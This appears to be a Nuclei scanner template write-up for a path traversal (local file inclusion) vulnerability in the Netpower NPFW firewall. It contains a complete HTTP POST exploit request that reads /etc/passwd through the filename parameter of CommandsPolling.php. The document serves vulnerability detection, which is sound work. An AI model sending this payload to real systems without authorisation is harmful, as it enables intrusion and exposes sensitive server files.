# Nuclei Template: Netpower NPFW - Local File Inclusion
**Template ID:** netpower-npfw-lfi
**Vulnerability Class:** Path Traversal
**Severity:** High
**Source:** Nuclei Template (`netpower-npfw-lfi.yaml`)

## Vulnerability Information & PoC

## Description
Netpower NPFW firewall has an arbitrary file read vulnerability. Due to insufficient code filtering, it can read any file on the server

## Steps to reproduce / Exploit Payload
```http
POST /direct/polling/CommandsPolling.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

command=ping&filename=%2Fetc%2Fpasswd&cmdParam=
```

## References
- https://forum.butian.net/article/241
